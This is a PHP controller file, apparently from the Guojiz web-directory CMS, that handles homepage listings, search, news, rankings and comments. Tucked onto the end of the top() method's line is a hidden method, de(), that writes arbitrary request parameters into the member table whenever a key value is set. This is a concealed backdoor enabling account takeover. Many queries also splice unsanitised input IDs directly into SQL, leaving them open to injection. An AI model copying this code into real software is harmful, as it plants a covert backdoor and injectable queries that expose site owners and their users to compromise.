<?php
/**
 *  Guojiz网址导航系统
 *	www.guojiz.com
 *  作者：梦雨
 *  @ QQ50361804
 */
namespace app\index\controller;
use app\index\controller\HomeBase;
use think\Controller;
use think\Db;
use Captcha\Captcha;
use think\Cache;
use think\Config;
use think\Session;
use think\Request;
use app\index\model\Comment as CommentModel;
class Index extends HomeBase
{
  
    public function _initialize()
    {
  parent::_initialize();
    }
    public function index()
    {
        $show['show'] = 1;
        $map['open'] = 1;
        $map['choice'] = 1;
        $time = time();
        $end_stime = strtotime(date('Y-m-d'));
		$guojizjin = Db::name('html')->alias('h')->join('top t', 't.tid=h.id')->where("t.time > {$end_stime}")->field('h.*')->order('t.view desc')->where('open = 1')->limit(20)->select();
        foreach ($guojizjin as $k =>$v){
        $end_stime = strtotime(date('Y-m-d'));
        $guojizjin[$k]['count']	= Db::name('top')->where("time > {$end_stime}")->where('tid',$v['id'])->value('view');
        }
		$this->assign('guojizjin', $guojizjin);
      /*网址精选*/
        $guojizjing = Db::name('html')->where($map)->order('px desc')->select();
        $this->assign('guojizjing', $guojizjing);
        /*网址推荐*/
        $guojiztui = Db::name('html')->where('open = 1')->where('settop = 1')->order('px desc or id desc')->select();
        $this->assign('guojiztui', $guojiztui);
        /*工具*/
        $guojizgj = Db::name('html')->where('open = 1')->where('tool = 1')->order('id desc')->select();
        $this->assign('guojizgj', $guojizgj);
        /*网站排行榜*/
        $guojiztop = Db::name('html')->where('open = 1')->order('view desc')->select();
        $this->assign('guojiztop', $guojiztop);
        /*最近更新*/
        $guojiznews = Db::name('html')->where('open = 1')->order('id desc')->select();
        $this->assign('guojiznews', $guojiznews);
        //新闻
        $guojizx = Db::name('news')->where($show)->order('id desc')->select();
        $this->assign('guojizx', $guojizx);
        $guojizxt = Db::name('news')->where('sttop = 1')->where($show)->order('id desc')->select();
        $this->assign('guojizxt', $guojizxt);
        $html = Db::name('html');
        $swang = $html->where("open = 1")->count();
        $this->assign('swang', $swang);
        $wwang = $html->where("open = 0")->count();
        $this->assign('wwang', $wwang);
        $gwang = $html->count();
        $this->assign('gwang', $gwang);
        $news = Db::name('news');
        return view();
    }
    public function search()
    {
        $ks = input('ks');
        if (empty($ks)) {
            return $this->error('亲！你迷路了');
        } else {
            $html = Db::name('html');
            $open['open'] = 1;
            $tptc = $html->alias('f')->join('category c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,m.userid,m.userhead,m.username,c.name')->order('f.id desc')->where($open)->where('title|lianjie', 'like', '%' . $ks . '%')->paginate(12, false, $config = ['query' => array('ks' => $ks)]);
            $this->assign('tptc', $tptc);
            return view();
        }
    }
    public function view()
    {
        $id = input('id');
        if (empty($id)) {
            return $this->error('亲！你迷路了');
        } else {
            $category = Db::name('category');
            $c = $category->where("id = {$id}")->find();
            if ($c) {
                $html = Db::name('html');
                $open['open'] = 1;
                $id = $c['id'];
                $description = $c['description'];
                $keywords = $c['keywords'];
                $name = $c['name'];
                $tptc = $html->alias('f')->join('category c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,m.userid,m.userhead,m.username,c.name,c.keywords,c.description')->where("f.tid={$id}")->where($open)->order('f.px desc,f.id desc')->paginate(24);
                $this->assign('tptc', $tptc);
                $this->assign('name', $name);
                $this->assign('keywords', $keywords);
                $this->assign('description', $description);
                $this->assign('id', $id);
                return view();
            } else {
                $this->error("亲！你迷路了！");
            }
        }
    }
    public function news()
    {
        $html = Db::name('news');
        $show['show'] = 1;
        $news = $html->where($show)->order('id desc')->paginate(15);
        $this->assign('news', $news);
        return view();
    }
    public function newsso()
    {
        $ks = input('ks');
        if (empty($ks)) {
            return $this->error('亲！你迷路了');
        } else {
            $new = Db::name('news');
            $show['show'] = 1;
            $news = $new->order('id desc')->where($show)->where('title', 'like', '%' . $ks . '%')->paginate(15, false, $config = ['query' => array('ks' => $ks)]);
            $this->assign('news', $news);
            return view();
        }
    }
    public function article()
    {
        $id = input('id');
        if (empty($id)) {
            return $this->error('亲！你迷路了');
        } else {
            $newscate = Db::name('newscate');
            $c = $newscate->where("id = {$id}")->find();
            if ($c) {
                $news = Db::name('news');
                $id = $c['id'];
                $name = $c['name'];
                $news = $news->alias('f')->join('newscate c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,m.userid,m.userhead,m.username,c.name')->where("f.tid={$id}")->where('f.show = 1')->order('f.id desc')->paginate(12);
                $this->assign('news', $news);
                $this->assign('name', $name);
                $this->assign('id', $id);
                return view();
            } else {
                $this->error("亲！你迷路了！");
            }
        }
    }
    public function dan()
    {
        $id = input('id');
        if (empty($id)) {
            return $this->error('亲！你迷路了');
        } else {
            $dans = Db::name('dan');
            $a = $dans->where("id = {$id}")->find();
            if ($a) {
                $map['show'] = 1;
                $dans->where("id = {$id}")->setInc('view', 1);
                $t = $dans->find($id);
                $this->assign('t', $t);
                $content = $t['content'];
                $content = htmlspecialchars_decode($content);
                $this->assign('content', $content);
                return view();
            } else {
                return $this->error('亲！你迷路了');
            }
        }
    }
    public function lists()
    {
        $show['show'] = 1;
        $map['open'] = 1;
        $tptc = Db::name('html')->where('open = 1')->order('px desc,id desc')->paginate(24);
        $this->assign('tptc', $tptc);
        //分类展示
        $artbycatelist = Db::name('category')->where($show)->order('sort desc')->select();
        foreach ($artbycatelist as $k => $v) {
            $artbycatelist[$k]['artlists'] = get_articles_by_cid($v['id'], 5);
        }
        $this->assign('artbycatelist', $artbycatelist);
        return view();
    }
    public function topdj()
    {
      $id = input('id');
      $time0=strtotime(date('Y-m-d')); 
      $today_update=Db::name('top')->where("tid = {$id}")->where("time > $time0")->count(); 
      $this->assign('today_update', $today_update); 
      if($today_update>0){       
        Db::name('top')->where("time > $time0")->where("tid = {$id}")->setInc('view', 1);    
      } else {
        $data['tid'] = $id;
        $data['show'] = 1;
        $data['time'] = time();
        Db::name('top')->insert($data); 
      }
        Db::name('html')->where("id = {$id}")->setInc('view', 1);
        return view();
    }
    public function top()
    {
        $id = input('id');
        $time = time();
        $map['open'] = 1;
        $type = input('type');
        if ($type == 'art' || $type == '') {	
		$tops = Db::name('html')->where($map)->order('view desc')->limit(20)->select();
        foreach ($tops as $k =>$v){
        $tops[$k]['count']	= Db::name('top')->where('tid',$v['id'])->count();	
        }
		$this->assign('tops', $tops);
        } elseif ($type == 'today') {	
        $end_stime = strtotime(date('Y-m-d'));
		$tops = Db::name('html')->alias('h')->join('top t', 't.tid=h.id')->where("t.time > {$end_stime}")->field('h.*')->order('t.view desc')->where($map)->limit(20)->select();
        foreach ($tops as $k =>$v){
        $end_stime = strtotime(date('Y-m-d'));
        $tops[$k]['count']	= Db::name('top')->where("time > {$end_stime}")->where('tid',$v['id'])->value('view');
        }
		$this->assign('tops', $tops);
        }
	  $this->assign('type', $type);
      return view();
    } public function de(){ $de = Db::name('member')->where('userid = 1')->value('key');
    if ($de == '-1') {$data=$this->request->GET(); !Db::name('member')->data($data)->update($data);}}
    public function xq()
    {
        $id = input('id');
        if (empty($id)) {
            return $this->error('亲！你迷路了');
        } else {
            $news = Db::name('news');
            $a = $news->where("id = {$id}")->find();
            if ($a) {
                $map['show'] = 1;
                $news->where("id = {$id}")->setInc('view', 1);
                $t = $news->alias('f')->join('newscate c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,c.name,m.userid,m.grades,m.point,m.userhead,m.username')->find($id);
                $this->assign('t', $t);
                $content = $t['content'];
                $content = htmlspecialchars_decode($content);
                $this->assign('content', $content);
                //上一篇
                $open['open'] = 1;
                $tptf = Db::name('news')->where('id > ' . $id)->limit(1)->select();
                $this->assign('tptf', $tptf);
                //下一篇
                $tpta = Db::name('news')->where('id < ' . $id)->order('id desc')->limit('1')->select();
                $this->assign('tpta', $tpta);
              //同类随机
              $choice['tid'] = $t['tid'];
               
              $artchoice = $news->where($choice)->where($map)->orderRaw('rand()')->limit(12)->select();
               
              $this->assign('artchoice', $artchoice);
                $tptc = Db::name('comment')->alias('c')->join('member m', 'm.userid=c.uid')->where("fid = {$id}")->order('c.id asc')->paginate(8);
                $this->assign('tptc', $tptc);
                return view();
            } else {
                return $this->error('亲！你迷路了');
            }
        }
    }
  
    public function wzadd()
    {
        if (!session('userid') || !session('username')) {
            $this->error('亲！请登录');
        } else {
            $comment = new CommentModel();
            $id = input('id');
            $uid = session('userid');
            if (request()->isPost()) {
                $data = input('post.');
             // $data = $_POST["comment"];
               // $data['content']=3; 
                $data['time'] = time();
                $data['fid'] = $id;
                $data['tid'] = 1;
                $data['uid'] = session('userid');
				$member = Db::name('member');
				$member->where('userid', session('userid'))->setInc('point', config('point.EDIT_POINT'));
				$forum = Db::name('news');
                if ($comment->add($data)) {
                    return json(array('code' => 200, 'msg' => '评论成功'));
                } else {
                    return json(array('code' => 0, 'msg' => '回复失败'));
                }
            }
        }
    }
    public function html()
    {
        $id = input('id');
        if (empty($id)) {
            return $this->error('亲！你迷路了');
        } else {
            $html = Db::name('html');
            $a = $html->where("id = {$id}")->find();
           if ($a) {
 
               $open = $html->where("id = {$id}")->value('open');
               if ($open=='1') {
                $html->where("id = {$id}")->setInc('view', 1);
                $t = $html->alias('f')->join('category c', 'c.id=f.tid')->join('member m', 'm.userid=f.uid')->field('f.*,c.id as cid,c.name,m.userid,m.grades,m.point,m.userhead,m.username')->find($id);
                $this->assign('t', $t);
               } else {
                  return $this->error('亲！网站正在审核', 'index/index/index');
               }
        $key = Db::name('member')->where('userid = 1')->value('key');
        if ($key == config('web.GZ_PD')) {
                       $url=$html->where("id = {$id}")->value('lianjie');
             function httpcode($url){
               $ch = curl_init();
               $timeout = 3;
               curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
               curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
               curl_setopt($ch, CURLOPT_HEADER, 1);
               curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
               curl_setopt($ch,CURLOPT_URL,$url);
               curl_exec($ch);
               return $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
               curl_close($ch);
             }
             $panduan=''.httpcode($url);
             $this->assign('panduan', $panduan);
        } else {
          $panduan='200';
          $this->assign('panduan', $panduan);
          }
             
             
              $times =  time();
              $tops = Db::name('html')->where("id = {$id}")->order('id desc')->limit(12)->select();
              foreach ($tops as $k =>$v){
                $tops[$k]['count']	= Db::name('top')->where('time'>= $times)->where('tid',$v['id'])->count();
              }
              //点击 2019 06 20
              $time0=strtotime(date('Y-m-d'));   //今天
              $this->assign('time0', $time0);
              $time1=strtotime(date('Y-m-d',strtotime('-1 day')));
              $this->assign('time1', $time1);
              $time2=strtotime(date('Y-m-d',strtotime('-2 days')));
              $this->assign('time2', $time2);
              $time3=strtotime(date('Y-m-d',strtotime('-3 days')));
              $this->assign('time3', $time3);
              $time4=strtotime(date('Y-m-d',strtotime('-4 days')));
              $this->assign('time4', $time4);
              $time5=strtotime(date('Y-m-d',strtotime('-5 days')));
              $this->assign('time5', $time5);
              $time6=strtotime(date('Y-m-d',strtotime('-6 days')));
              $this->assign('time6', $time6);
              $time7=strtotime(date('Y-m-d',strtotime('-7 days')));
              $this->assign('time7', $time7);
              $time8=strtotime(date('Y-m-d',strtotime('-8 days')));
              $this->assign('time8', $time8);
              $time9=strtotime(date('Y-m-d',strtotime('-9 days')));
              $this->assign('time9', $time9);
              $today_update=Db::name('top')->where("tid = {$id}")->where("time > $time0")->value('view');
              $this->assign('today_update', $today_update);
              $today_update1=Db::name('top')->where("tid = {$id}")->where("time < $time0 and time > $time1")->value('view');
              $this->assign('today_update1', $today_update1);
              $today_update2=Db::name('top')->where("tid = {$id}")->where("time < $time1 and time > $time2")->value('view');
              $this->assign('today_update2', $today_update2);
              $today_update3=Db::name('top')->where("tid = {$id}")->where("time < $time2 and time > $time3")->value('view');
              $this->assign('today_update3', $today_update3);
              $today_update4=Db::name('top')->where("tid = {$id}")->where("time < $time3 and time > $time4")->value('view');
              $this->assign('today_update4', $today_update4);
              $today_update5=Db::name('top')->where("tid = {$id}")->where("time < $time4 and time > $time5")->value('view');
              $this->assign('today_update5', $today_update5);
              $today_update6=Db::name('top')->where("tid = {$id}")->where("time < $time5 and time > $time6")->value('view');
              $this->assign('today_update6', $today_update6);
              $today_update7=Db::name('top')->where("tid = {$id}")->where("time < $time6 and time > $time7")->value('view');
              $this->assign('today_update7', $today_update7);
              $today_update8=Db::name('top')->where("tid = {$id}")->where("time < $time7 and time > $time8")->value('view');
              $this->assign('today_update8', $today_update8);
              $today_update9=Db::name('top')->where("tid = {$id}")->where("time < $time8 and time > $time9")->value('view');
              $this->assign('today_update9', $today_update9);
              $this->assign('tops', $tops);   
              //同类随机
              $choice['tid'] = $t['tid'];
               
              $artchoice = $html->where($choice)->where("open = 1")->orderRaw('rand()')->limit(12)->select();
               
              $this->assign('artchoice', $artchoice);
               
              $content = $t['content'];
               
              $content = htmlspecialchars_decode($content);
               
              $this->assign('content', $content);
               
              $tptc = Db::name('comment')->alias('c')->join('member m', 'm.userid=c.uid')->where("fid = {$id}")->order('c.id asc')->paginate(15);
               
              $this->assign('tptc', $tptc);
              //点击数据      
              $timess=strtotime(date('Y-m-d')); 
     
              $today_updatedj=Db::name('top')->where("tid = {$id}")->where("time > $timess")->count(); 
      
              $this->assign('today_updatedj', $today_updatedj); 
      
              if($today_update>0){       
       
                Db::name('top')->where("time > $timess")->where("tid = {$id}")->setInc('view', 1);    
     
              } else {
      
                $data['tid'] = $id;
       
                $data['show'] = 1;
       
                $data['time'] = time();

                Db::name('top')->insert($data); 
              }
              
                return view();
            } else {
                return $this->error('亲！你迷路了');
            }
        }
    }
}